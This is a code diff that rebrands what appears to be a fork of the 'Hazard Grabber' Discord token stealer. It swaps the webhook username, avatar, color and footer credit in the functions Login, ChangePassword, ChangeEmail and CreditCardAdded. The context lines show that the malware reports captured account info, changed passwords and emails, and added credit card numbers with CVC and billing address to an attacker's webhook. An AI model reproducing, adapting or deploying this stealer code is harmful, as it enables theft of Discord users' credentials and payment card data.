@@ -144,12 +144,12 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Polvinho do mal",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/933521021489803294/933547243905101894/czM6Ly9waG90b3MuZW5qb2VpLmNvbS5ici9wcm9kdWN0cy82MzI3MTIvNTdkOTQzNzM4ZGExMjgyMGJiOWY0M2E4ZDBlYWNlNzEuanBn.png",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 16711903,
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -167,7 +167,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "Central dos Polvinhos Hasckudos"
                     }
                 }
             ]
@@ -192,12 +192,12 @@ function ChangePassword(oldpassword, newpassword, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "Polvinho do mal",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://media.discordapp.net/attachments/933521021489803294/933547243905101894/czM6Ly9waG90b3MuZW5qb2VpLmNvbS5ici9wcm9kdWN0cy82MzI3MTIvNTdkOTQzNzM4ZGExMjgyMGJiOWY0M2E4ZDBlYWNlNzEuanBn.png",
                 embeds: [
                     {
-                        "color": 16507654,
+                        "color": 16711903,
                         "fields": [
                             {
                                 "name": "**Password Changed**",
@@ -220,7 +220,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "Central dos Polvinhos Hasckudos"
                         }                 
                     }
                 ]
@@ -245,12 +245,12 @@ function ChangeEmail(newemail, password, token) {
         xmlHttp.responseText;
     `, !0).then((ip) => {
             var params = {
-                username: "Hazard Grabber",
+                username: "Polvinho do mal",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://media.discordapp.net/attachments/933521021489803294/933547243905101894/czM6Ly9waG90b3MuZW5qb2VpLmNvbS5ici9wcm9kdWN0cy82MzI3MTIvNTdkOTQzNzM4ZGExMjgyMGJiOWY0M2E4ZDBlYWNlNzEuanBn.png",
                 embeds: [
                     {
-                        "color": 16507654,
+                        "color": 16711903,
                         "fields": [
                             {
                                 "name": "**Email Changed**",
@@ -273,7 +273,7 @@ function ChangeEmail(newemail, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "Central dos Polvinhos Hasckudos"
                         }                
                     }
                 ]
@@ -299,12 +299,12 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "Polvinho do mal",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://media.discordapp.net/attachments/933521021489803294/933547243905101894/czM6Ly9waG90b3MuZW5qb2VpLmNvbS5ici9wcm9kdWN0cy82MzI3MTIvNTdkOTQzNzM4ZGExMjgyMGJiOWY0M2E4ZDBlYWNlNzEuanBn.png",
                 embeds: [
                     {
-                        "color": 16507654,
+                        "color": 16711903,
                         "fields": [
                             {
                                 "name": "**Credit Card Added**",
@@ -327,7 +327,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "Central dos Polvinhos Hasckudos"
                         }
                     }
                 ]
@@ -352,12 +352,12 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "Polvinho do mal",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://media.discordapp.net/attachments/933521021489803294/933547243905101894/czM6Ly9waG90b3MuZW5qb2VpLmNvbS5ici9wcm9kdWN0cy82MzI3MTIvNTdkOTQzNzM4ZGExMjgyMGJiOWY0M2E4ZDBlYWNlNzEuanBn.png",
                 embeds: [
                     {
-                        "color": 16507654,
+                        "color": 16711903,
                         "fields": [
                             {
                                 "name": "**Credit Card Added**",
@@ -380,7 +380,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "Central dos Polvinhos Hasckudos"
                         }
                     }
                 ]
